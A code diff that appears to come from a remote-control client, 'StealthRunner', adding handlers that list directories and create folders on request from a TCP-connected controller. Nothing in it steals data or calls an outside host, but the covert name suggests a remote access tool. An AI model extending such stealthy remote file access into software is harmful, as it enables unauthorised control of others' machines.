@@ -21,5 +21,39 @@ namespace FlexiLeaf.StealthRunner.Handlers
             //await Client.Send(packet);
         }
 
+        [PacketHandler]
+        public async static void FileExplorer(FileExplorerPacket packet, TcpClient Client)
+        {
+            packet.ExplorePath();
+            await Client.Send(packet);
+        }
+
+        [PacketHandler]
+        public async static void FileExplorer(CreateFolderPacket packet, TcpClient Client)
+        {
+            try
+            {
+                string newPath = Path.Combine(packet.Path, packet.Name);
+
+                if (!Directory.Exists(newPath))
+                {
+                    Directory.CreateDirectory(newPath);
+                    var fileExplorerPacket = new FileExplorerPacket(packet.Path);
+                    fileExplorerPacket.ExplorePath();
+                    await Client.Send(fileExplorerPacket);
+
+                }
+                else
+                {
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+
+
+
+
     }
 }
